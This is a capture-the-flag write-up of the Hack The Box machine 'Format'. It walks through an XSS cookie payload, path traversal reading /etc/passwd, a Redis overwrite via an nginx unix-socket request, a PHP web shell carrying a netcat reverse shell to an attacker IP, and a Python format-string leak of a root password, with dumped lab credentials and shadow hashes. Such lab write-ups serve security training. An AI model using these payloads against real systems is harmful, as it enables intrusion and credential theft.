### Basic information about FORMAT.
* https://app.hackthebox.com/machines/Format
* IP: 10.10.11.213

### Scan
TCP: 
```bash
#rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.213 -- -sV -sC -oN nmap.txt
Nmap scan report for 10.10.11.213 (10.10.11.213)
Host is up, received echo-reply ttl 63 (0.099s latency).
Scanned at 2023-05-17 20:36:59 +07 for 17s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC58JQV36v8AqpQBAsbocbjiyrKYAACc=
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYA
|   256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK9eUks4+f4DtePOKRJYzDggTf1cOpMhtAxXHGSqr5ng
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Site doesnt have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
3000/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
UDP: 
```bash
#sudo nmap -T4 --top-ports 1000 --min-rate 10000 -sU --open 10.10.11.213 -oN top-1000-udp.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-17 20:41 +07
Nmap scan report for 10.10.11.213 (10.10.11.213)
Host is up (0.081s latency).
All 1000 scanned ports on 10.10.11.213 (10.10.11.213) are in ignored states.
Not shown: 994 open|filtered udp ports (no-response), 6 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
```
### Web enumeration
add vhost to `/etc/hosts`

`10.10.11.213 microblog.htb  app.microblog.htb` 

**HTTP 80**

![alt text](https://github.com/col-1002/Write-ups/blob/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230517204756.png)

**HTTP 3000**

![alt text](https://github.com/col-1002/Write-ups/blob/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230517213615.png)

There are 2 parameters, `id` and `txt`, used for the title and content. We can write to the file as we wish
```php
#http://microblog.htb:3000/cooper/microblog/src/branch/main/microblog/sunny/edit/index.php
//add header
if (isset($_POST['header']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

```

The _fetchPage_ reads each line in the `order.txt` file as a topic, reads the content, and outputs it, thus combining with the previous steps to form

**LFI**

```php
#http://microblog.htb:3000/cooper/microblog/src/branch/main/microblog/sunny/index.php
function fetchPage() {
    chdir(getcwd() . "/content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}
```
### MicroBlog
We register for an account, create our own blog, add its name to `/etc/hosts`. Next, we edit and add the title and content.
```
POST /register/index.php HTTP/1.1
Host: app.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://app.microblog.htb
DNT: 1
Connection: close
Referer: http://app.microblog.htb/register/
Cookie: username=f5b43mrh60u956rbsgp15nrgai
Upgrade-Insecure-Requests: 1

first-name=hacker&last-name=hack&username=hacker&password=hacker123
```

create a new blog domain "hacker.microblog.htb" and add it `/etc/hosts` file.


**XSS**

```
POST /edit/index.php HTTP/1.1
Host: hacker.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://hacker.microblog.htb
DNT: 1
Connection: close
Referer: http://hacker.microblog.htb/edit/
Cookie: username=f5b43mrh60u956rbsgp15nrgai
Upgrade-Insecure-Requests: 1

id=6ryya4odeeh&header=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```

***Output:***

```username=f5b43mrh60u956rbsgp15nrgai```


**LFI**
```
POST /edit/index.php HTTP/1.1
Host: hacker.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://hacker.microblog.htb
DNT: 1
Connection: close
Referer: http://hacker.microblog.htb/edit/
Cookie: username=f5b43mrh60u956rbsgp15nrgai
Upgrade-Insecure-Requests: 1

id=../../../../../../etc/passwd&header=sss
```

## Output:

```
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologincooper:x:1000:1000::/home/cooper:/bin/bashredis:x:103:33::/var/lib/redis:/usr/sbin/nologingit:x:104:111:Git Version Control,,,:/home/git:/bin/bashmessagebus:x:105:112::/nonexistent:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologin_laurel:x:997:997::/var/log/laurel:/bin/false
```

#### Redis key overwrite
[Middleware everywhere and lots of misconfigurations to fix | Detectify Labs](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/)

Luckily, redis commands accepting a variable amount of arguments do exist. MSET ([https://redis.io/commands/mset](https://redis.io/commands/mset)) takes a variable amount of keys and values:

```
MSET key1 "Hello" key2 "World"
GET key1
“Hello”
GET key2
“World”
```

In other words, we can use a request such as this to write any key:

```
MSET /static/unix:%2ftmp%2fmysocket:hacked%20%22true%22%20/app-1555347823-min.js HTTP/1.1
Host: example.com
```

Resulting in the following data on the socket (to redis):

```
MSET hacked "true" -example.s3.amazonaws.com/app-1555347823-min.js 
HTTP/1.0
Host: localhost
Connection: close
```
##### get isPro

```bash
curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:hacker%20pro%20true%20a/b
```

```bash
┌─[loc@parrot]─[~/HackTheBox/Medium/Format]
└──╼ $curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:hacker%20pro%20true%20a/b
<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```

Now I am pro user.

##### shell as www-data

```php
#http://microblog.htb:3000/cooper/microblog/src/branch/main/microblog/app/index.php

function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}

```

```php
#http://microblog.htb:3000/cooper/microblog/src/branch/main/microblog/sunny/edit/index.php
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

```
With the pro account, we can insert webshell. 
```bash
id=/var/www/microblog/hacker/uploads/rev.php&header=%3C%3Fphp+echo+shell_exec%28%22rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Csh+-i+2%3E%261%7Cnc+10.10.16.2+9001+%3E%2Ftmp%2Ff%22%29%3B%3F%3E
```

## In BurpSuite:

```
POST /edit/index.php HTTP/1.1
Host: hacker.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Origin: http://hacker.microblog.htb
DNT: 1
Connection: close
Referer: http://hacker.microblog.htb/edit/
Cookie: username=f5b43mrh60u956rbsgp15nrgai
Upgrade-Insecure-Requests: 1

id=/var/www/microblog/hacker/uploads/rev.php&header=%3C%3Fphp+echo+shell_exec%28%22rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Csh+-i+2%3E%261%7Cnc+10.10.16.2+9001+%3E%2Ftmp%2Ff%22%29%3B%3F%3E
```


## Browser:  `http://hacker.microblog.htb/uploads/rev.php` to get revserse shell.
```bash
┌─[loc@parrot]─[~/HackTheBox/Medium/Format]
└──╼ $nc -lvnp 4545
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4545
Ncat: Listening on 0.0.0.0:4545
Ncat: Connection from 10.10.11.213.
Ncat: Connection from 10.10.11.213:43864.
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Redis command  [Redis Cheat Sheet (lzone.de)](https://lzone.de/cheat-sheet/Redis)
```bash
www-data@format ~$redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> 
redis /var/run/redis/redis.sock> echo "keys *" | redis-cli -s /var/run/redis/redis.sock
(error) ERR wrong number of arguments for 'echo' command
redis /var/run/redis/redis.sock> keys *
 1) "PHPREDIS_SESSION:20hi483jceq8g0t8523r8585pj"
 2) "hacker:sites"
 3) "PHPREDIS_SESSION:aotk6stg7aoh6lsdccsq2qhai6"
 4) "cooper.dooper:sites"
 5) "wml"
 6) "hacker"
 7) "nghiale"
 8) "PHPREDIS_SESSION:d8o1k85mud6l8l0i0hrkadj77c"
 9) "cooper.dooper"
10) "PHPREDIS_SESSION:00111mmhsdjjlnq7stv5g3sooh"
11) "nghiale:sites"
redis /var/run/redis/redis.sock> hgetall cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "zooperdoopercooper"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"
redis /var/run/redis/redis.sock>
```
creds: `cooper:zooperdoopercooper` . Login through SSH to get user flag
#### Shell as cooper
```bash
┌─[loc@parrot]─[~/HackTheBox/Medium/Format]
└──╼ $ssh cooper@10.10.11.213
cooper@10.10.11.21 password: 
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
-----
permitted by applicable law.
cooper@format:~$ id
uid=1000(cooper) gid=1000(cooper) groups=1000(cooper)
```
#### Priv Esc

```bash
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

This is a Python program, and we notice that the username is concatenated, and the following section is formatted as a hint for the format string `{license.license}`

```python
#cooper@format:~$ file /usr/bin/license
#/usr/bin/license: Python script, ASCII text executable
#cooper@format:~$ cat /usr/bin/license
#!/usr/bin/python3

import base64
...
#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
...
```

The username is retrieved from Redis, and if we modify it, we can use Python's format string:
[Python format string vulnerabilities · Podalirius](https://podalirius.net/en/articles/python-format-string-vulnerabilities/)

![alt text](https://github.com/col-1002/Write-ups/blob/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230518005139.png)

We change the username in `Redis` 
```bash
redis-cli -s /var/run/redis/redis.sock  
hset hacker username {license.__init__.__globals__}  
```

```bash
#cooper@format:~$ sudo /usr/bin/license -p hacker
#[sudo] password for cooper: 

Plaintext license key:
------------------------------------------------------
microblog{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f143ae83970>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/bin/license', '__cached__': None, 'base64': <module 'base64' from /u
<SNIP>
, '__warningregistry__': {'version': 0}, 'secret': 'unCR4ckaBL3Pa$$w0rd', 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd', 'salt': b'microblogsalt123', 'kdf': <cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC object at 0x7f143987c070>, 'encryption_key': b'nTXlHnzf-z2cR0ADCHOrYga7--k6Ii6BTUKhwmTHOjU=', 'f': <cryptography.fernet.Fernet object at 0x7f143987c490>, 'l': <__main__.License object at 0x7f143987ca00>, 'user_profile': {b'username': b'{license.__init__.__globals__}', b'password': b'password', b'first-name': b'loc', b'last-name': b'loc', b'pro': b'false'}, 'existing_keys': <_io.TextIOWrapper name='/root/license/keys' mode='r' encoding='UTF-8'>, 'all_keys': ['cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n'], 'user_key': 'cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n', 'prefix': 'microblog', 'username': '{license.__init__.__globals__}', 'firstlast': 'locloc'}6)zI1y/FeNn*:_KH}<(e-5/^W}AQk3FcA@Ao{e`1locloc
```

secret: `unCR4ckaBL3Pa$$w0rd`

##### Root
```bash
cooper@format:~$ su root
Password: #unCR4ckaBL3Pa$$w0rd

root@format:/home/cooper# cd

root@format:~# cd /root

root@format:~# ls
license  reset	root.txt

root@format:~# cat root.txt
31b43f9d5acdea16d28012b35b533f35

root@format:~# cat /etc/shadow
root:$y$j9T$tYoCSn/hikACa4FLjkFxx/$vg7mvtDQNyfOazsy/RpEgxOzAzSktNbOiJWZkTr9ynD:19443:0:99999:7:::
daemon:*:19298:0:99999:7:::
bin:*:19298:0:99999:7:::
sys:*:19298:0:99999:7:::
sync:*:19298:0:99999:7:::
games:*:19298:0:99999:7:::
man:*:19298:0:99999:7:::
lp:*:19298:0:99999:7:::
mail:*:19298:0:99999:7:::
news:*:19298:0:99999:7:::
uucp:*:19298:0:99999:7:::
proxy:*:19298:0:99999:7:::
www-data:*:19298:0:99999:7:::
backup:*:19298:0:99999:7:::
list:*:19298:0:99999:7:::
irc:*:19298:0:99999:7:::
gnats:*:19298:0:99999:7:::
nobody:*:19298:0:99999:7:::
_apt:*:19298:0:99999:7:::
systemd-network:*:19298:0:99999:7:::
systemd-resolve:*:19298:0:99999:7:::
systemd-timesync:!*:19298::::::
systemd-coredump:!*:19298::::::
cooper:$y$j9T$ctbv4v7TD6ys.rBW.4sou/$6..9q9HWLzKbpmqzL6R81pVJ.8IFdhDwqqnqlL425x/:19300:0:99999:7:::
redis:*:19298:0:99999:7:::
git:*:19300:0:99999:7:::
messagebus:*:19452:0:99999:7:::
sshd:*:19452:0:99999:7:::
_laurel:!:19465::::::
```

#### Additional references

* [Python format string vulnerabilities · Podalirius](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) 
* [Redis Cheat Sheet (lzone.de)](https://lzone.de/cheat-sheet/Redis)
* [Middleware everywhere and lots of misconfigurations to fix | Detectify Labs](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/)
* [Profile Link](https://app.hackthebox.com/profile/718010)
